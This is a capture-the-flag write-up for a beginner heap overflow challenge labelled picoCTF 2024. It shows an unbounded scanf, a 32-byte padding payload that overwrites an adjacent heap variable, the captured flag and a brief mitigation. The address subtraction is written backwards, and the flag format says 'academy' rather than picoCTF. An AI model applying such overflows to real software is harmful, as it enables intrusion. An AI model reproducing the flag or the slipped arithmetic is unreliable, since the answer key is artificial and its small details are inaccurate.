## CTF: picoCTF 2024

Challenge: Heap 1

Category: pwn

Points: 15

Difficulty: Intermediate

## Instructions

Can you control your overflow?

## Solution

This challenge introduces the basics of heap overflows. Baseline checks:

```bash
$ checksec --file=chall
[*] '/home/amichel2579-academy/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
```

64-bit, no PIE, not stripped. The program has two global pointers — `input_data` and `safe_var` — both on the heap. The menu lets you print the heap, write to a buffer, print safe_var, and check for the flag.

Looking at the source:

```c
void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");
        // Print flag
    }
}

void write_buffer() {
    printf("Data for buffer: ");
    scanf("%s", input_data);
}
```

`write_buffer` uses a vulnerable `scanf("%s", input_data)` with no size limit. To get the flag, `safe_var` must equal "pico". The two heap allocations are 32 bytes apart:

```
0x2562f6b0 - 0x2562f6d0 = 32
```

So we need 32 bytes of padding then "pico":

```
Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico

Enter your choice: 4

YOU WIN
academy{starting_to_get_the_hang_514bac2b}
```

## Flag

```
academy{starting_to_get_the_hang_514bac2b}
```

## Mitigation

Limit the input size of the user so they can't overwrite adjacent data.
